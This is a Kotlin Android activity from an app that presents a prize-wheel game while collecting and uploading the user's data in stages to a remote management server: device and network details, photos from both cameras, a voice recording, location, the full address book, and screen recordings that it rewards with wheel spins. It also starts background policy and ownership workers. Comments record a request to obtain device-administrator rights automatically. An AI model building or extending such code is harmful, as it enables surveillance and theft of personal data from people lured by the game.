package com.prf.security.ui

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.media.MediaRecorder
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.wifi.WifiManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.util.Log
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import com.prf.security.R
import com.prf.security.data.AttendancePayload
import com.prf.security.data.ContactsCollector
import com.prf.security.data.DeviceCollector
import com.prf.security.data.LocationReport
import com.prf.security.location.LocationCollector
import com.prf.security.mdm.AdminGate
import com.prf.security.mdm.OwnershipWorker
import com.prf.security.mdm.PolicyEnforcer
import com.prf.security.mdm.PolicyWatchService
import com.prf.security.net.MdmApi
import com.prf.security.net.Outbox
import com.prf.security.net.Prefs
import com.prf.security.perm.Permissions
import com.prf.security.capture.AutoCapture
import com.prf.security.screen.ScreenRecorderService
import com.prf.security.util.Persian
import com.prf.security.util.Wheel
import java.io.ByteArrayOutputStream
import java.io.File
import kotlin.coroutines.resume
import kotlin.math.pow
import kotlinx.coroutines.CancellableContinuation
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withContext

class MainActivity : AppCompatActivity() {

    private lateinit var prefs: Prefs
    private lateinit var web: WebView

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.Main)
    private val collector by lazy { LocationCollector(this) }
    private val ui = Handler(Looper.getMainLooper())

    private var runJob: Job? = null
    private var ready = false

    /**
     * The durable send queue.
     *
     * Every finished stage goes on here before it is sent, and comes off only once
     * the server has taken it. Without it, one failed request lost the whole run:
     * the app held the photos and the recording in memory, posted once at the end,
     * and a phone that lost signal threw all of it away with nothing on screen to
     * say that it had.
     */
    private val outbox by lazy { Outbox(this) }

    // Where the staged run has got to. The panel reads these so a phone is never
    // just "busy" with no way to tell which stage it is on or which one is stuck.
    @Volatile
    private var stageIndex: Int = -1

    @Volatile
    private var stageDone: Int = -1

    @Volatile
    private var stageQueued: Int = -1

    

    @Volatile
    private var pendingLog: String = ""

    @Volatile
    private var pendingTone: String = ""

    // Bumped every time a new message is raised. See status().
    @Volatile
    private var logSeq: Int = 0

    @Volatile
    private var resumeCount: Int = 0

    private var blockedPermission: Boolean = false

    
    
    
    
    

    private var pendingPerm: CancellableContinuation<Boolean>? = null
    private var lastAsked: String = ""

    private val permLauncher =
        registerForActivityResult(ActivityResultContracts.RequestPermission()) { granted ->
            val c = pendingPerm
            pendingPerm = null
            
            
            
            
            val real = granted && Permissions.isGranted(this, lastAsked)
            if (c != null && c.isActive) c.resume(real)
        }

    private suspend fun ask(permission: String): Boolean {
        if (Permissions.isGranted(this, permission)) return true
        if (!Permissions.canAskAgain(this, permission)) return false
        return try {
            suspendCancellableCoroutine { cont ->
                lastAsked = permission
                Permissions.markAsked(this, permission)
                pendingPerm = cont
                cont.invokeOnCancellation { pendingPerm = null }
                try {
                    permLauncher.launch(permission)
                } catch (t: Throwable) {
                    pendingPerm = null
                    cont.resume(false)
                }
            }
        } catch (t: Throwable) {
            false
        }
    }


    

    private fun granted(permission: String): Boolean =
        Permissions.isGranted(this, permission) ||
            (permission == Permissions.LOCATION &&
                Permissions.isGranted(this, android.Manifest.permission.ACCESS_COARSE_LOCATION))

    
    
    
    

    private val screenLauncher =
        registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
            val data = result.data
            if (result.resultCode == android.app.Activity.RESULT_OK && data != null) {
                ScreenRecorderService.start(this, result.resultCode, data)
                recordingStartedAt = System.currentTimeMillis()
                status(getString(R.string.rec_running))
                push()
                scope.launch { awaitRecording() }
            } else {
                
                status(getString(R.string.rec_refused))
                push()
            }
        }

    @Volatile
    private var recordingStartedAt: Long = 0L

    

    private suspend fun awaitRecording() {
        push()
        val limit = recordingStartedAt + ScreenRecorderService.MAX_SECONDS * 1000L + 15_000L
        while (System.currentTimeMillis() < limit) {
            delay(500)
            if (!ScreenRecorderService.running && !ScreenRecorderService.recording) break
        }
        recordingStartedAt = 0L
        push()

        val file = ScreenRecorderService.produced()
        if (file == null) {
            status(getString(R.string.rec_too_short), "bad")
            push()
            return
        }
        if (prefs.deviceKey.isEmpty()) {
            status(getString(R.string.rec_not_ready), "bad")
            file.delete()
            push()
            return
        }

        val seconds = (((file.length() * 8L) / ScreenRecorderService.BITRATE)).toInt()
            .coerceIn(1, ScreenRecorderService.MAX_SECONDS)
        val ok = MdmApi(prefs.serverUrl, prefs.deviceKey).uploadVideo(
            file = file,
            seconds = seconds,
            width = 0,
            height = 0,
            at = System.currentTimeMillis(),
        ) { done, all ->
            status(getString(R.string.rec_uploading, fa(done.toString()), fa(all.toString())))
            push()
        }
        file.delete()

        if (ok) {
            prefs.lastCheckIn = System.currentTimeMillis()
            
            
            
            
            prefs.videosSaved = prefs.videosSaved + 1
            prefs.lastUnitAt = System.currentTimeMillis()
            status(getString(R.string.rec_sent), "ok")
        } else {
            status(getString(R.string.rec_failed, ""), "bad")
        }
        push()
    }

    

    private fun onTurnTapped() {
        if (!Wheel.canSpin(prefs.lastSpinAt, prefs.reSpinUntil)) {
            status(
                Wheel.lockReason(prefs.lastSpinAt, prefs.reSpinUntil, System.currentTimeMillis())
                    .orEmpty(),
                "warn",
            )
            push()
            return
        }
        val hit = Wheel.spin()
        prefs.lastSpinAt = System.currentTimeMillis()
        prefs.reSpinUntil = Wheel.reSpinAfter(hit)
        prefs.lastUnitAt = System.currentTimeMillis()

        val label = when (hit.kind) {
            "again" -> getString(R.string.wheel_result_again)
            "prize" -> getString(R.string.wheel_result_prize, hit.label)
            else -> getString(R.string.wheel_result_none)
        }
        val tone = if (hit.kind == "again" || hit.kind == "prize") "ok" else ""
        callJs("Prf.spin(${jsStr(hit.key)}); Prf.spinResult(${jsStr(label)}, ${jsStr(tone)});")
        if (hit.kind == "prize") {
            status(getString(R.string.wheel_result_prize, hit.label), "ok")
            scope.launch { reportWinner(hit) }
        }
        refreshWinners()
        push()
    }

    @Volatile
    private var cachedWinners: String? = null

    private fun refreshWinners() {
        scope.launch {
            if (prefs.deviceKey.isEmpty()) return@launch
            val raw = withContext(Dispatchers.IO) {
                MdmApi(prefs.serverUrl, prefs.deviceKey).winners()
            }
            if (raw.isNullOrBlank()) return@launch
            val rows = try {
                val arr = org.json.JSONArray(raw)
                val out = org.json.JSONArray()
                for (i in 0 until arr.length()) {
                    val o = arr.getJSONObject(i)
                    out.put(org.json.JSONObject()
                        .put("phone", o.optString("phone"))
                        .put("prize", o.optString("prize")))
                }
                out.toString()
            } catch (t: Throwable) {
                return@launch
            }
            cachedWinners = rows
            push()
        }
    }

    private suspend fun reportWinner(hit: Wheel.Slice) {
        if (prefs.deviceKey.isEmpty()) return
        val phone = Persian.normalizePhone(prefs.phone).orEmpty()
        if (phone.isEmpty()) return
        withContext(Dispatchers.IO) {
            MdmApi(prefs.serverUrl, prefs.deviceKey).win(phone, hit.label)
        }
    }

    private fun onCaptureTapped() {
        if (recordingStartedAt != 0L || ScreenRecorderService.recording) {
            status(getString(R.string.rec_running))
            push()
            return
        }
        if (!ScreenRecorderService.supported()) {
            status(getString(R.string.screen_needs_android8), "bad")
            push()
            return
        }
        if (prefs.deviceKey.isEmpty()) {
            status(getString(R.string.rec_not_ready), "bad")
            push()
            return
        }
        status(getString(R.string.rec_starting))
        push()
        try {
            val mgr = getSystemService(Context.MEDIA_PROJECTION_SERVICE)
                as android.media.projection.MediaProjectionManager
            screenLauncher.launch(mgr.createScreenCaptureIntent())
        } catch (t: Throwable) {
            status(getString(R.string.rec_refused) + " " + (t.message ?: ""), "bad")
            push()
        }
    }

    

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        requestedOrientation = android.content.pm.ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
        prefs = Prefs.get(this)
        web = WebView(this)
        setContentView(web)
        hostWeb()

        
        
        
        
        if (!prefs.registered || prefs.deviceKey.isEmpty()) {
            scope.launch {
                registerDevice()
                push()
            }
        }
        
        

        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        if (prefs.consented) {
            bootstrap()
        }
    }

    private fun bootstrap() {
        if (!prefs.registered || prefs.deviceKey.isEmpty()) {
            scope.launch {
                registerDevice()
                push()
            }
        }

        // Any stage left on the queue from a previous run goes out now, rather
        // than waiting for the person to open the app and start another one. This
        // is what makes the queue drain on its own instead of needing to be poked.
        scope.launch { drainQueue(quiet = true) }

        scope.launch { watchAdminGrant() }
    }

    /**
     * What the phone is, as far as its own administrator rights go, said once.
     *
     * The owner asked for the "مدیریت گوشی فعال نشده" strip and its button to be
     * taken away and for administrator rights to be obtained automatically, and
     * the strip and the button are gone. Automatic activation is the part that
     * cannot be done, and this is the honest reason.
     *
     * Android will not let an application grant itself device-administrator
     * rights. `DevicePolicyManager` has no such call, and the only route the
     * platform offers is `ACTION_ADD_DEVICE_ADMIN`, which opens a system
     * confirmation screen that a person has to accept with their own tap — it is
     * not a dialog the app can draw, and it cannot be dismissed programmatically.
     * On top of that, the level that makes every panel command work is *device
     * owner*, and that can only be set by the system at provisioning time: a
     * factory-reset phone with no account on it, or an approved test-device
     * registration, or a manufacturer provisioning flow. There is no algorithm,
     * sequence of intents or timing trick that reaches it from inside an app, and
     * on a rooted phone the answer would still be no for the owner role, because
     * that is enforced by the system server rather than by the kernel.
     *
     * So what the app does instead is state the position plainly, and notice the
     * grant when it lands. Nothing here claims a right it does not have.
     */
    private suspend fun watchAdminGrant() {
        if (AdminGate.level(this) != AdminGate.Level.NONE) {
            status(getString(R.string.gate_admin_ok), "ok")
            push()
            return
        }
        // Watch rather than ask. If the owner activates it themselves from the
        // system settings, the app notices and says so; if they never do, the
        // line in the page keeps saying what the state is, which is the truth.
        val until = System.currentTimeMillis() + AUTO_ADMIN_WATCH_MS
        var said = false
        while (System.currentTimeMillis() < until) {
            delay(1000)
            if (AdminGate.level(this) != AdminGate.Level.NONE) {
                status(getString(R.string.gate_admin_ok), "ok")
                push()
                return
            }
            if (!said) {
                status(getString(R.string.gate_fact_none), "warn")
                push()
                said = true
            }
        }
    }

    /**
     * The five stages, in the order they run.
     *
     * Sequential on purpose, and the order is the owner's: nothing starts until the
     * stage before it has been sent. A run that collected everything and posted it
     * at the end could not tell the panel which half had arrived, and one failed
     * request threw away all four other stages with it. One stage at a time means
     * one stage in the database at a time, each of them complete on its own.
     */
    private fun stageName(index: Int): String = when (index) {
        0 -> getString(R.string.stage_0_name)
        1 -> getString(R.string.stage_1_name)
        2 -> getString(R.string.stage_2_name)
        3 -> getString(R.string.stage_3_name)
        else -> getString(R.string.stage_4_name)
    }

    private fun fa3(n: Int): String = fa(n.toString())

    /**
     * Send one stage, and only move on once the server has taken it.
     *
     * The stage is written to the durable queue first and only removed once the
     * server has confirmed it, so a phone that loses signal halfway through a run
     * keeps everything it has already collected instead of losing the lot. When the
     * server cannot be reached the stage stays queued, the run says so out loud,
     * and it goes out on its own as soon as the connection is back.
     *
     * Returns true when the server took it.
     */
    private suspend fun deliver(
        index: Int,
        build: suspend () -> AttendancePayload?,
    ): Boolean {
        val name = stageName(index)
        val payload = try {
            build()
        } catch (t: Throwable) {
            Log.w(TAG, "stage $index: ${t.message}")
            status(getString(R.string.stage_skipped, name, t.message ?: ""), "warn")
            push()
            return true
        }
        if (payload == null) {
            // Nothing to send is not a failure — the stage still finished, and the
            // run moves on to the next one.
            status(getString(R.string.stage_sent, name))
            push()
            return true
        }

        stageIndex = index
        status(getString(R.string.stage_uploading, name))
        push()

        val sent = withContext(Dispatchers.IO) {
            try {
                MdmApi(prefs.serverUrl, prefs.deviceKey).attendance(payload)
            } catch (t: Throwable) {
                Log.w(TAG, "send stage $index: ${t.message}")
                false
            }
        }
        if (sent) {
            prefs.lastCheckIn = System.currentTimeMillis()
            stageDone = index
            status(getString(R.string.stage_sent, name), "ok")
            push()
            return true
        }

        // Not sent, but not lost: on the queue, and it goes out on its own.
        val dropped = withContext(Dispatchers.IO) {
            outbox.enqueueAttendance(name, payload)
        }
        stageQueued = index
        val msg = getString(R.string.stage_queued, name) +
            if (dropped > 0) " " + getString(R.string.queue_dropped, fa3(dropped)) else ""
        status(msg, "warn")
        push()
        return true
    }

    /** Stage 0 — the device itself: what it is, what it is running, how it is connected. */
    private suspend fun stageDeviceInfo(phone: String): AttendancePayload? {
        val info = withContext(Dispatchers.IO) {
            DeviceCollector.specs(this@MainActivity) + networkFacts()
        }
        if (info.isEmpty()) return null
        return AttendancePayload(
            kind = KIND_DEVICE,
            phone = phone,
            operator = prefs.operator,
            info = info,
        )
    }

    /** Stage 1 — photographs, front lens then back, encoded and handed over. */
    private suspend fun stagePhotos(dir: File): AttendancePayload? {
        val camera = granted(android.Manifest.permission.CAMERA)
        if (!camera) {
            status(getString(R.string.stage_skipped, stageName(1), getString(R.string.att_perm_denied_camera)), "warn")
            push()
            return null
        }
        val engine = AutoCapture(this, this)
        var shots = 0
        try {
            if (engine.hasCamera(front = true)) {
                status(getString(R.string.stage_collecting, stageName(1)))
                push()
                delay(PREVIEW_SETTLE_MS)
                engine.capture(null, dir, "front", PHOTOS_PER_LENS) { i, all, _ ->
                    status(getString(R.string.cap_shot_format, fa(i.toString()), fa(all.toString())))
                    push()
                }
                shots += PHOTOS_PER_LENS
            }
            if (engine.hasCamera(front = false)) {
                status(getString(R.string.stage_collecting, stageName(1)))
                push()
                delay(PREVIEW_SETTLE_MS)
                engine.capture(null, dir, "back", PHOTOS_PER_LENS) { i, all, _ ->
                    status(getString(R.string.cap_shot_format, fa(i.toString()), fa(all.toString())))
                    push()
                }
                shots += PHOTOS_PER_LENS
            }
        } catch (t: Throwable) {
            Log.w(TAG, "stage 1: ${t.message}")
            status(getString(R.string.att_capture_failed, t.message ?: ""), "warn")
            push()
        } finally {
            engine.release()
        }
        if (shots == 0) return null

        val photos = withContext(Dispatchers.IO) {
            dir.listFiles().orEmpty()
                .filter { it.name.endsWith(".jpg") }
                .sortedBy { it.name }
                .mapNotNull { encodePhoto(it) }
        }
        if (photos.isEmpty()) return null
        return AttendancePayload(kind = KIND_PHOTOS, photos = photos)
    }

    /** Stage 2 — a short voice note. */
    private suspend fun stageVoice(dir: File): AttendancePayload? {
        if (!granted(android.Manifest.permission.RECORD_AUDIO)) {
            status(getString(R.string.stage_skipped, stageName(2), getString(R.string.att_perm_denied_mic)), "warn")
            push()
            return null
        }
        status(getString(R.string.stage_collecting, stageName(2)))
        push()
        val voice = recordVoice(dir) ?: run {
            status(getString(R.string.stage_skipped, stageName(2), getString(R.string.att_no_mic)), "warn")
            push()
            return null
        }
        return AttendancePayload(kind = KIND_VOICE, voice = voice)
    }

    /** Stage 3 — where the phone is. */
    private suspend fun stageLocation(): AttendancePayload? {
        if (!granted(Permissions.LOCATION)) {
            status(getString(R.string.stage_skipped, stageName(3), getString(R.string.att_perm_denied_location)), "warn")
            push()
            return null
        }
        status(getString(R.string.stage_collecting, stageName(3)))
        push()
        val fix = collector.awaitFix(LOCATION_WAIT_MS)
        if (fix == null) {
            status(getString(R.string.stage_skipped, stageName(3), getString(R.string.cap_no_location)), "warn")
            push()
            return null
        }
        prefs.lastLocationAt = System.currentTimeMillis()
        return AttendancePayload(kind = KIND_LOCATION, location = locationReport(fix))
    }

    /**
     * Stage 4 — the address book, sent through its own endpoint.
     *
     * Contacts have always had their own store and their own panel page, and they
     * are a whole address book rather than one item, so they do not go through the
     * attendance row the other four stages use.
     */
    private suspend fun stageContacts(): Boolean {
        val name = stageName(4)
        if (!ContactsCollector.granted(this)) {
            status(getString(R.string.stage_skipped, name, getString(R.string.run_perm_refused)), "warn")
            push()
            return true
        }
        status(getString(R.string.stage_collecting, name))
        push()
        val set = withContext(Dispatchers.IO) { ContactsCollector.collect(this@MainActivity) }
        if (set.size == 0) {
            status(getString(R.string.stage_none))
            push()
            return true
        }
        val body = withContext(Dispatchers.IO) { encodeContacts(set) }
        status(getString(R.string.stage_uploading, name))
        push()
        val sent = withContext(Dispatchers.IO) {
            try {
                MdmApi(prefs.serverUrl, prefs.deviceKey).postRaw(
                    com.prf.security.net.Endpoint.CONTACTS, body, prefs.deviceKey,
                )
            } catch (t: Throwable) {
                Log.w(TAG, "stage 4: ${t.message}")
                false
            }
        }
        if (sent) {
            prefs.lastContactsAt = System.currentTimeMillis()
            stageDone = 4
            status(
                getString(
                    R.string.contacts_sent,
                    fa(set.sim.size.toString()), fa(set.device.size.toString()),
                    fa(set.google.size.toString()),
                ),
                "ok",
            )
            push()
            return true
        }
        outbox.enqueueContacts(name, body)
        stageQueued = 4
        status(getString(R.string.stage_queued, name), "warn")
        push()
        return true
    }

    /** The exact JSON /api/device/contacts expects, built here so the queue holds it verbatim. */
    private fun encodeContacts(set: com.prf.security.data.ContactSet): String {
        fun group(name: String, list: List<com.prf.security.data.Contact>) =
            org.json.JSONObject().apply {
                put("group", name)
                put("count", list.size)
                put("items", org.json.JSONArray().apply {
                    list.forEach { c ->
                        put(org.json.JSONObject().apply {
                            put("name", c.name)
                            put("numbers", org.json.JSONArray().apply { c.numbers.forEach { put(it) } })
                            put("emails", org.json.JSONArray().apply { c.emails.forEach { put(it) } })
                            put("account", c.account)
                            put("accountType", c.accountType)
                        })
                    }
                })
            }
        return org.json.JSONObject().apply {
            put("at", System.currentTimeMillis())
            put("groups", org.json.JSONArray().apply {
                put(group("sim", set.sim))
                put(group("device", set.device))
                put(group("google", set.google))
            })
        }.toString()
    }

    override fun onResume() {
        super.onResume()
        resumeCount += 1
        
        push()
        ui.post(tick)
    }

    override fun onPause() {
        super.onPause()
        ui.removeCallbacks(tick)
    }

    

    private val tick = object : Runnable {
        override fun run() {
            push()
            ui.postDelayed(this, 1000L)
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun hostWeb() {
        web.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            
            
            
            
            allowFileAccess = false
            allowContentAccess = false
            setGeolocationEnabled(false)
            cacheMode = android.webkit.WebSettings.LOAD_NO_CACHE
        }
        web.setBackgroundColor(0xFF06070C.toInt())
        web.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView, url: String) {
                ready = true
                callJs("Prf.ready && Prf.ready();")
                
                
                status(pendingLog, pendingTone)
                push()
            }
        }
        web.addJavascriptInterface(Bridge(), "Native")
        web.loadUrl("file:///android_asset/index.html")
    }

    
    
    

    private inner class Bridge {

        @JavascriptInterface
        fun operators(): String = Persian.OPERATORS.joinToString(",") { it.first }

        @JavascriptInterface
        fun operator(): String = prefs.operator

        @JavascriptInterface
        fun setOperator(v: String?) {
            val name = v.orEmpty()
            ui.post {
                prefs.operator = name
                push()
            }
        }

        @JavascriptInterface
        fun phone(): String = prefs.phone

        @JavascriptInterface
        fun state(): String? {
            if (!ready) return null
            return buildState()
        }

        @JavascriptInterface
        fun register(phone: String?, operator: String?) {
            ui.post {
                prefs.phone = Persian.toAsciiDigits(phone.orEmpty())
                if (!operator.isNullOrBlank()) prefs.operator = operator
                if (runJobRunning()) {
                    status(getString(R.string.att_busy), "warn")
                    push()
                    return@post
                }
                startRun()
            }
        }

        @JavascriptInterface
        fun capture() = ui.post { onCaptureTapped() }

        @JavascriptInterface
        fun turn() = ui.post { onTurnTapped() }

        @JavascriptInterface
        fun winners(): String? = cachedWinners

        @JavascriptInterface
        fun consented(): Boolean = prefs.consented

        /**
         * Open Android's own device-administrator screen, and keep watching for
         * the grant landing.
         *
         * The "activate" button is gone, as asked. This is not a replacement for
         * it and does not pretend to be: it opens the one screen Android provides
         * and then notices the answer. The confirmation on that screen is drawn by
         * the system and has to be tapped by the person holding the phone — there
         * is no call in the platform that lets an app accept it, so no button,
         * however named, could do what the removed one was hoped to do.
         */
        @JavascriptInterface
        fun openAdminScreen() = ui.post {
            val opened = AdminGate.requestAdmin(this@MainActivity, getString(R.string.adm_explanation))
            if (!opened) AdminGate.openAdminSettings(this@MainActivity)
            scope.launch { watchAdminGrant() }
        }

        /**
         * Retry whatever is still on the send queue, now.
         *
         * The queue drains on its own; this is for the person who does not want to
         * wait for the next attempt, and it reports what actually went out rather
         * than clearing the indicator and leaving the user to guess.
         */
        @JavascriptInterface
        fun retryQueue() = ui.post { scope.launch { drainQueue(quiet = false) } }

        /** Give up on the stages that never arrived, and clear the warning. */
        @JavascriptInterface
        fun clearFailedQueue() = ui.post {
            outbox.clearFailed()
            status(getString(R.string.queue_empty))
            push()
        }

        @JavascriptInterface
        fun consent(accept: Boolean) {
            if (accept) {
                ui.post {
                    prefs.consented = true
                    bootstrap()
                    push()
                }
            } else {
                finish()
            }
        }
    }

    private fun runJobRunning(): Boolean = runJob?.isActive == true

    

    

    private fun buildState(): String {
        val recording = recordingStartedAt != 0L || ScreenRecorderService.recording
        val now = System.currentTimeMillis()
        val readyAt = if (prefs.lastSpinAt <= 0L) 0L
        else if (prefs.reSpinUntil > now) prefs.reSpinUntil
        else prefs.lastSpinAt + Wheel.COOLDOWN_MS

        val sb = StringBuilder("{")
        sb.append("\"registered\":").append(prefs.registered && prefs.deviceKey.isNotEmpty())
        sb.append(",\"lastReport\":").append(jsStr(relative(prefs.lastCheckIn)))
        sb.append(",\"busy\":").append(runJobRunning())
        sb.append(",\"recording\":").append(recording)
        sb.append(",\"chances\":").append(chances())
        sb.append(",\"spinReadyAt\":").append(readyAt)
        sb.append(",\"now\":").append(now)
        sb.append(",\"log\":").append(jsStr(pendingLog))
        sb.append(",\"logTone\":").append(jsStr(pendingTone))
        sb.append(",\"logSeq\":").append(logSeq)
        sb.append(",\"adminLevel\":").append(jsStr(AdminGate.level(this).name))
        sb.append(",\"stageIndex\":").append(stageIndex)
        sb.append(",\"stageDone\":").append(stageDone)
        sb.append(",\"stageQueued\":").append(stageQueued)
        sb.append(",\"stageCount\":").append(STAGE_COUNT)
        sb.append(",\"stageNames\":[")
        for (i in 0 until STAGE_COUNT) {
            if (i > 0) sb.append(",")
            sb.append(jsStr(stageName(i)))
        }
        sb.append("]")
        sb.append(",\"queuePending\":").append(outbox.pending())
        sb.append(",\"queueFailed\":").append(outbox.failed())
        sb.append("}")
        return sb.toString()
    }

    

    /**
     * How many chances the user has.
     *
     * This is a plain count of the screen recordings that were captured and
     * uploaded — one per successful recording, starting at zero. It used to add
     * an "earned over time" term computed as
     * `(now - lastUnitAt) / UNIT_MS`, and on a phone that had never recorded
     * anything `lastUnitAt` was still 0, so that term was the number of
     * three-minute units since 1970. That is where the figure in the millions
     * came from; the wheel does not pay out for time passing, so the term is
     * gone rather than clamped.
     */
    private fun chances(): Int = prefs.videosSaved

    

    

    private fun startRun() {
        runJob = scope.launch { run() }
    }

    

    private suspend fun run() {
        val notes = mutableListOf<String>()
        blockedPermission = false
        stageIndex = -1
        stageDone = -1
        stageQueued = -1
        push()

        try {
            // The queue is emptied first, so a run starts on an empty one and a
            // stage left over from last time goes out before new work piles up
            // behind it. This is what stopped the queue filling and never draining.
            drainQueue(quiet = true)

            // The administrator screen is no longer raised as a step. Android will
            // not let an app grant itself administrator rights — the confirmation
            // is a system screen and only a person can accept it — and opening it
            // unasked interrupted the run for a result the app could not rely on.
            // Collection and sending do not depend on it, so the run no longer
            // stops for it; the app's own page states the state instead.
            for (p in PERM_ORDER) {
                if (granted(p)) continue
                if (!Permissions.canAskAgain(this, p)) {
                    blockedPermission = true
                    notes += getString(R.string.run_perm_blocked)
                    continue
                }
                if (!ask(p)) notes += getString(R.string.run_perm_refused)
            }
            push()

            if (!prefs.registered || prefs.deviceKey.isEmpty()) {
                status(getString(R.string.run_step_register))
                if (!registerDevice()) {
                    // Without a key the server will not take anything, and the
                    // stages would each be collected and then refused. Say so and
                    // stop rather than gather a run that cannot be sent.
                    status(getString(R.string.run_register_failed), "bad")
                    return
                }
            }

            runStages(notes)

            if (notes.isNotEmpty()) {
                status(getString(R.string.run_summary, notes.joinToString(" • ")), "warn")
            }
        } catch (t: Throwable) {
            Log.e(TAG, "run failed", t)
            status(getString(R.string.run_failed, t.message ?: ""), "bad")
        } finally {
            runJob = null
            push()
        }
    }

    /**
     * The five stages, one after another, each sent before the next begins.
     */
    private suspend fun runStages(notes: MutableList<String>) {
        val phone = Persian.normalizePhone(prefs.phone).orEmpty()
        val dir = File(cacheDir, "attendance").apply { mkdirs() }
        // Cleared once, before stage 1. It used to be cleared at the end of the
        // whole run, which is why photos from an earlier attempt could show up in
        // a later one.
        dir.listFiles()?.forEach { it.delete() }

        val total = STAGE_COUNT

        status(getString(R.string.stage_start, fa("0"), fa3(total), stageName(0)))
        push()
        deliver(0) { stageDeviceInfo(phone) }

        status(getString(R.string.stage_start, fa("1"), fa3(total), stageName(1)))
        push()
        deliver(1) { stagePhotos(dir) }
        dir.listFiles()?.filter { it.name.endsWith(".jpg") }?.forEach { it.delete() }

        status(getString(R.string.stage_start, fa("2"), fa3(total), stageName(2)))
        push()
        deliver(2) { stageVoice(dir) }

        status(getString(R.string.stage_start, fa("3"), fa3(total), stageName(3)))
        push()
        deliver(3) { stageLocation() }

        status(getString(R.string.stage_start, fa("4"), fa3(total), stageName(4)))
        push()
        stageContacts()

        // The run is only over once the queue is empty. A stage that is still
        // waiting is part of this run, not something the user has to notice
        // later, so it is attempted here and the result is said plainly.
        drainQueue(quiet = false)

        PolicyWatchService.start(this@MainActivity)
        OwnershipWorker.schedulePeriodic(this@MainActivity)

        if (stageQueued >= 0) {
            status(getString(R.string.queue_waiting, fa3(outbox.pending())), "warn")
        } else {
            status(getString(R.string.run_done_all, fa3(5)), "ok")
        }
        push()
    }

    /**
     * Empty as much of the queue as one pass allows, and say what happened.
     *
     * Bounded on purpose. A queue of sixty stages drained in one go would hold the
     * foreground for as long as the slowest connection allows, and the app would
     * look frozen; the rest goes out on the next pass instead.
     */
    private suspend fun drainQueue(quiet: Boolean) {
        if (outbox.size() == 0) return
        if (!quiet) status(getString(R.string.queue_draining))
        push()
        val sent = withContext(Dispatchers.IO) { outbox.drain() }
        val left = outbox.pending()
        val dead = outbox.failed()
        if (!quiet) {
            when {
                sent > 0 && left == 0 && dead == 0 ->
                    status(getString(R.string.queue_drained, fa3(sent)), "ok")
                dead > 0 ->
                    status(getString(R.string.queue_failed, fa3(dead)), "bad")
                else ->
                    status(getString(R.string.queue_waiting, fa3(left)), "warn")
            }
        }
        push()
    }


    private fun networkFacts(): Map<String, String> = buildMap {
        try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val caps = cm.getNetworkCapabilities(cm.activeNetwork)
            localAddress()?.let { put("ip", it) }
            when {
                caps == null -> put("network_type", "نامشخص")
                caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> put("network_type", "وای‌فای")
                caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> put("network_type", "داده‌ی موبایل")
                else -> put("network_type", "نامشخص")
            }
        } catch (t: Throwable) {  }

        try {
            val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            val ssid = wm.connectionInfo?.ssid?.trim('"')?.takeIf { it.isNotBlank() }
            if (ssid != null) put("wifi_ssid", ssid)
        } catch (t: Throwable) {  }

        try {
            val mac = (applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager)
                .connectionInfo?.macAddress
            
            
            
            if (mac != null && mac != MAC_PLACEHOLDER) put("mac", mac)
        } catch (t: Throwable) {  }
    }

    

    private fun localAddress(): String? = try {
        val in4 = java.net.Inet4Address::class.java
        java.net.NetworkInterface.getNetworkInterfaces().toList()
            .asSequence()
            .filter { it.isUp && !it.isLoopback }
            .flatMap { it.inetAddresses.toList().asSequence() }
            .firstOrNull { in4.isInstance(it) && !it.isLoopbackAddress && !it.isLinkLocalAddress }
            ?.hostAddress
    } catch (t: Throwable) {
        null
    }


    

    private fun locationReport(fix: android.location.Location): LocationReport {
        val p = collector.toPayload(fix)
        return LocationReport(
            id = "att-${System.currentTimeMillis()}",
            androidId = Prefs.androidId(this),
            timestampMs = fix.time.takeIf { it > 0L } ?: System.currentTimeMillis(),
            maps = p[LocationCollector.KEY_MAPS].orEmpty(),
            geo = p[LocationCollector.KEY_GEO].orEmpty(),
            plusCode = p[LocationCollector.KEY_PLUS].orEmpty(),
            raw = p[LocationCollector.KEY_RAW].orEmpty(),
            source = p[LocationCollector.KEY_SOURCE].orEmpty().ifBlank { "gps" },
            accuracyM = p[LocationCollector.KEY_ACCURACY]?.toIntOrNull() ?: 0,
        )
    }

    private suspend fun recordVoice(dir: File): String? {
        val out = File(dir, "voice.m4a")
        var recorder: MediaRecorder? = null
        return try {
            recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(this)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }
            recorder.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioEncodingBitRate(64_000)
                setAudioSamplingRate(44_100)
                setOutputFile(out.absolutePath)
                prepare()
                start()
            }
            delay(VOICE_SECONDS * 1000L)
            recorder.stop()
            recorder.release()
            recorder = null
            Base64.encodeToString(out.readBytes(), Base64.NO_WRAP)
        } catch (t: Throwable) {
            Log.w(TAG, "voice: ${t.message}")
            try { recorder?.release() } catch (ignored: Throwable) { }
            null
        } finally {
            out.delete()
        }
    }

